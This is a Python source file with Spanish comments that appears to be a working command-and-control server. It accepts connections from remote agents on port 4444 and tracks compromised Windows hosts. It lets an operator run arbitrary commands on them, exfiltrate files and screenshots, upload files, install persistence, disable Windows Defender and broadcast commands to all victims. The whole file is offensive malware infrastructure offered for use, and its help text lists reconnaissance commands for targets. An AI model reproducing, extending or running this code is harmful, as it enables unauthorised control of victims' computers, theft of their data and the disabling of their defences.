#!/usr/bin/env python3
import socket
import struct
import json
import base64
import time
import threading
import os
import sys
import readline
from datetime import datetime
from collections import OrderedDict

# ============================================
# PROTOCOLO (MISMO QUE EL AGENTE)
# ============================================

class SecureProtocol:
    @staticmethod
    def send(sock, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        key = struct.pack('I', int(time.time()) % 1000000)
        encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
        
        length = len(encrypted)
        sock.sendall(struct.pack('>I', length) + encrypted)
    
    @staticmethod
    def receive(sock, timeout=30):
        sock.settimeout(timeout)
        
        try:
            length_data = sock.recv(4)
            if not length_data or len(length_data) != 4:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            
            encrypted = b''
            while len(encrypted) < length:
                chunk = sock.recv(min(4096, length - len(encrypted)))
                if not chunk:
                    return None
                encrypted += chunk
            
            key = struct.pack('I', int(time.time()) % 1000000)
            decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
            
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None

# ============================================
# SERVIDOR C2
# ============================================

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = OrderedDict()
        self.protocol = SecureProtocol()
        self.running = True
        
    def start(self):
        """Iniciar servidor C2"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(100)
        
        self._show_banner()
        
        # Thread para aceptar conexiones
        accept_thread = threading.Thread(target=self._accept_connections, args=(sock,))
        accept_thread.daemon = True
        accept_thread.start()
        
        # Shell interactiva principal
        self._main_shell()
        
        sock.close()
    
    def _accept_connections(self, sock):
        """Aceptar conexiones entrantes"""
        while self.running:
            try:
                client, addr = sock.accept()
                
                # Manejar en thread separado
                thread = threading.Thread(target=self._handle_session, args=(client, addr))
                thread.daemon = True
                thread.start()
                
            except:
                break
    
    def _handle_session(self, client, addr):
        """Manejar sesión de agente"""
        session_id = f"{addr[0]}_{int(time.time())}"
        
        try:
            # Recibir handshake
            handshake = self.protocol.receive(client)
            if not handshake:
                client.close()
                return
            
            # Parsear información del agente
            try:
                agent_info = json.loads(handshake)
                session_data = {
                    'client': client,
                    'addr': addr,
                    'info': agent_info,
                    'connected_at': datetime.now(),
                    'last_seen': datetime.now()
                }
                
                self.sessions[session_id] = session_data
                
                print(f"\n[+] NUEVA SESIÓN: {session_id}")
                print(f"    Host: {agent_info.get('hostname', 'Unknown')}")
                print(f"    User: {agent_info.get('username', 'Unknown')}")
                print(f"    Priv: {agent_info.get('privileges', 'Unknown')}")
                print(f"    IP: {addr[0]}:{addr[1]}")
                print(f"    ID: {agent_info.get('agent_id', 'Unknown')}")
                
                # Mantener conexión para recibir respuestas
                self._keep_alive(session_id)
                
            except json.JSONDecodeError:
                print(f"[+] Conexión raw de {addr}: {handshake[:100]}")
                client.close()
                
        except Exception as e:
            print(f"[-] Error con {addr}: {e}")
            if session_id in self.sessions:
                del self.sessions[session_id]
            client.close()
    
    def _keep_alive(self, session_id):
        """Mantener sesión activa y recibir respuestas"""
        while session_id in self.sessions and self.running:
            try:
                session = self.sessions[session_id]
                client = session['client']
                
                # Recibir datos (timeout corto para no bloquear)
                data = self.protocol.receive(client, timeout=1)
                if data:
                    session['last_seen'] = datetime.now()
                    
                    try:
                        response = json.loads(data)
                        if response.get('type') == 'command_result':
                            print(f"\n[RESPUESTA de {session_id}]")
                            print("-" * 60)
                            print(f"Comando: {response.get('command', 'Unknown')}")
                            print("-" * 60)
                            result = response.get('result', '')
                            
                            # Manejar tipos especiales de respuesta
                            if result.startswith('FILE:'):
                                # Descargar archivo
                                parts = result.split(':', 2)
                                if len(parts) == 3:
                                    filename = parts[1]
                                    filedata = parts[2]
                                    self._save_file(filename, filedata)
                                    print(f"[+] Archivo recibido: {filename}")
                            elif result.startswith('SCREENSHOT:'):
                                # Guardar screenshot
                                filedata = result[11:]
                                filename = f"screenshot_{session_id}_{int(time.time())}.png"
                                self._save_file(filename, filedata)
                                print(f"[+] Screenshot guardado: {filename}")
                            else:
                                print(result)
                            
                            print("-" * 60)
                    except:
                        # Respuesta raw
                        print(f"\n[RAW de {session_id}]:\n{data[:500]}")
                
            except:
                time.sleep(0.1)
    
    def _save_file(self, filename, b64_data):
        """Guardar archivo desde base64"""
        try:
            downloads_dir = "c2_downloads"
            os.makedirs(downloads_dir, exist_ok=True)
            
            filepath = os.path.join(downloads_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            
            print(f"[+] Archivo guardado: {filepath}")
        except Exception as e:
            print(f"[-] Error guardando archivo: {e}")
    
    def _main_shell(self):
        """Shell interactiva principal"""
        while self.running:
            try:
                cmd = input("\nc2> ").strip()
                
                if cmd.lower() == 'exit':
                    self.running = False
                    print("[!] Apagando C2...")
                    break
                
                elif cmd.lower() == 'help':
                    self._show_help()
                
                elif cmd.lower() == 'sessions':
                    self._list_sessions()
                
                elif cmd.lower().startswith('session '):
                    parts = cmd.split(' ', 1)
                    if len(parts) == 2:
                        self._session_shell(parts[1])
                
                elif cmd.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                
                elif cmd.lower() == 'broadcast':
                    self._broadcast_command()
                
                elif cmd.lower().startswith('kill '):
                    session_id = cmd[5:].strip()
                    self._kill_session(session_id)
                
                elif cmd.lower() == 'status':
                    self._show_status()
                
                else:
                    print("[!] Comando no reconocido. Usa 'help'")
                    
            except KeyboardInterrupt:
                print("\n[!] Usa 'exit' para salir")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def _session_shell(self, session_id):
        """Shell para sesión específica"""
        if session_id not in self.sessions:
            print(f"[-] Sesión {session_id} no encontrada")
            return
        
        session = self.sessions[session_id]
        agent_info = session['info']
        
        print(f"\n[+] Interactuando con sesión {session_id}")
        print(f"    Host: {agent_info.get('hostname')}")
        print(f"    User: {agent_info.get('username')}")
        print(f"    Tipo 'back' para volver\n")
        
        while session_id in self.sessions:
            try:
                cmd = input(f"c2@{session_id}> ").strip()
                
                if cmd.lower() == 'back':
                    break
                
                elif cmd.lower() == 'help':
                    print("\nComandos de sesión:")
                    print("  shell <comando>    - Ejecutar comando")
                    print("  download <archivo> - Descargar archivo")
                    print("  upload <local> <remoto> - Subir archivo")
                    print("  screenshot         - Tomar screenshot")
                    print("  persistence        - Instalar persistencia")
                    print("  clear_defender     - Desactivar Defender")
                    print("  info               - Info del sistema")
                    print("  back               - Volver al menú principal")
                
                elif cmd.lower() == 'info':
                    self._send_command(session_id, 'sysinfo')
                
                elif cmd.lower() == 'screenshot':
                    self._send_command(session_id, 'screenshot')
                
                elif cmd.lower() == 'persistence':
                    self._send_command(session_id, 'persistence')
                
                elif cmd.lower() == 'clear_defender':
                    self._send_command(session_id, 'clear_defender')
                
                elif cmd.lower().startswith('download '):
                    filepath = cmd[9:].strip()
                    self._send_command(session_id, f'download {filepath}')
                
                elif cmd.lower().startswith('upload '):
                    parts = cmd[7:].strip().split(' ', 1)
                    if len(parts) == 2:
                        local_file, remote_path = parts
                        if os.path.exists(local_file):
                            with open(local_file, 'rb') as f:
                                filedata = base64.b64encode(f.read()).decode('ascii')
                            self._send_command(session_id, f'upload {filedata} {remote_path}')
                        else:
                            print(f"[-] Archivo no encontrado: {local_file}")
                
                elif cmd.lower().startswith('shell '):
                    command = cmd[6:].strip()
                    self._send_command(session_id, command)
                
                else:
                    # Comando directo
                    self._send_command(session_id, cmd)
                    
            except KeyboardInterrupt:
                print("\n[!] Volviendo al menú principal...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def _send_command(self, session_id, command):
        """Enviar comando a sesión específica"""
        if session_id not in self.sessions:
            print(f"[-] Sesión {session_id} no existe")
            return
        
        session = self.sessions[session_id]
        cmd_data = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            self.protocol.send(session['client'], json.dumps(cmd_data))
            print(f"[+] Comando enviado: {command[:50]}...")
        except Exception as e:
            print(f"[-] Error enviando comando: {e}")
            del self.sessions[session_id]
    
    def _list_sessions(self):
        """Listar sesiones activas"""
        if not self.sessions:
            print("[-] No hay sesiones activas")
            return
        
        print(f"\n[+] Sesiones activas ({len(self.sessions)}):")
        print("-" * 80)
        
        for i, (session_id, session) in enumerate(self.sessions.items(), 1):
            info = session['info']
            last_seen = (datetime.now() - session['last_seen']).seconds
            
            print(f"{i:2}. {session_id}")
            print(f"    Host: {info.get('hostname', 'Unknown')}")
            print(f"    User: {info.get('username', 'Unknown')}")
            print(f"    Priv: {info.get('privileges', 'Unknown')}")
            print(f"    IP: {session['addr'][0]}:{session['addr'][1]}")
            print(f"    ID: {info.get('agent_id', 'Unknown')}")
            print(f"    Last: {last_seen}s ago")
            print("-" * 80)
    
    def _broadcast_command(self):
        """Enviar comando a todas las sesiones"""
        if not self.sessions:
            print("[-] No hay sesiones para broadcast")
            return
        
        command = input("Comando para broadcast: ").strip()
        if not command:
            return
        
        confirm = input(f"¿Enviar '{command}' a {len(self.sessions)} sesiones? (y/n): ")
        if confirm.lower() != 'y':
            return
        
        for session_id in list(self.sessions.keys()):
            self._send_command(session_id, command)
    
    def _kill_session(self, session_id):
        """Terminar sesión específica"""
        if session_id in self.sessions:
            try:
                self.protocol.send(self.sessions[session_id]['client'], 
                                 json.dumps({'type': 'exit'}))
                del self.sessions[session_id]
                print(f"[+] Sesión {session_id} terminada")
            except:
                del self.sessions[session_id]
                print(f"[-] Sesión {session_id} removida")
        else:
            print(f"[-] Sesión {session_id} no encontrada")
    
    def _show_status(self):
        """Mostrar estado del C2"""
        print(f"\n[+] C2 Server Status")
        print(f"    Puerto: {self.port}")
        print(f"    Sesiones activas: {len(self.sessions)}")
        print(f"    Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if self.sessions:
            print("\n    Sesiones:")
            for session_id in self.sessions.keys():
                print(f"      - {session_id}")
    
    def _show_help(self):
        """Mostrar ayuda"""
        help_text = """
COMANDOS DISPONIBLES:

  sessions          - Listar sesiones activas
  session <id>      - Interactuar con sesión específica
  broadcast         - Enviar comando a todas las sesiones
  kill <id>         - Terminar sesión específica
  status            - Mostrar estado del C2
  clear             - Limpiar pantalla
  exit              - Salir del C2

COMANDOS DE SESIÓN (dentro de session <id>):

  shell <comando>   - Ejecutar cualquier comando de Windows
  download <ruta>   - Descargar archivo desde el target
  upload <loc> <rem> - Subir archivo al target
  screenshot        - Tomar screenshot del target
  persistence       - Instalar persistencia en el target
  clear_defender    - Desactivar Windows Defender
  info              - Obtener información del sistema
  back              - Volver al menú principal

EJEMPLOS DE COMANDOS:
  shell whoami
  shell ipconfig /all
  shell net user
  shell systeminfo
  shell dir C:\\Users
  shell tasklist
  shell netstat -ano
  shell powershell Get-Process
  shell reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        """
        print(help_text)
    
    def _show_banner(self):
        """Mostrar banner"""
        banner = f"""
        ╔══════════════════════════════════════════════════╗
        ║               ADVANCED C2 SERVER                 ║
        ║               Port: {self.port}                          ║
        ║               Protocol: Secure XOR               ║
        ║               Status: LISTENING                  ║
        ╚══════════════════════════════════════════════════╝
        
        [+] Listening on {self.host}:{self.port}
        [+] Type 'help' for available commands
        [+] Waiting for agents...
        """
        print(banner)

# ============================================
# EJECUCIÓN
# ============================================

def main():
    """Función principal"""
    # Configurar autocompletado
    if os.name == 'posix':
        readline.parse_and_bind("tab: complete")
    
    # Iniciar servidor C2
    server = C2Server(port=4444)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
